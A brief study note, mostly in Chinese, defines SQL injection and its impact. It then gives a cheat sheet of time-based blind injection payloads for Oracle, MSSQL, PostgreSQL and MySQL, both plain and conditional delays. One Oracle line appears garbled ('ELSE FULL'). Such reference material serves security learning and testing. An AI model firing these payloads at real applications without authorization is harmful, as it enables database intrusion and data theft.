sql injection note

​ sql injection 是一个WEB安全漏洞，允许攻击者干扰应用程序对数据库的查询。通常情况下允许攻击者查看无法通过应用程序检索的数据。这可能包括其他用户的数据，应用程序本身能访问的所有数据。在许多情况下，攻击者可修改或删除该数据，从而导致对应用程序的数据进行持久更改。

Infulence

​ 利用sql injection攻击成功可能导致未经授权访问敏感数据，如密码、信用卡详细信息或者个人用户信息。在某些特殊情况下，可以利用sql injection 获得服务器的持久性后门，从而导致长期危害，而且在长时间内该后门可能会被忽视掉。

关于延时查询

数据库 帮助
ORACLE dbms_pipe.receive_message((‘a’),10)
MSSQL WAITFOR DELAY ‘0:0:10’
PostgreSQL SELECT pg_sleep(10)
Mysql SELECT sleep(10)

关于使用条件进行延时查询

数据库 帮助
ORACLE SELECT CASE WHEN (true) THEN ‘a’||dbms_pipe.receive_message((‘a’),10) ELSE FULL END FROM dual
MSSQL IF (YOUR-CONDITION-HERE) WAITFOR DELAY ‘0:0:10’
PostgreSQL SELECT CASE WHEN (true) THEN pg_sleep(10) ELSE pg_sleep(0) END
Mysql SELECT IF(true,sleep(10),’a’)
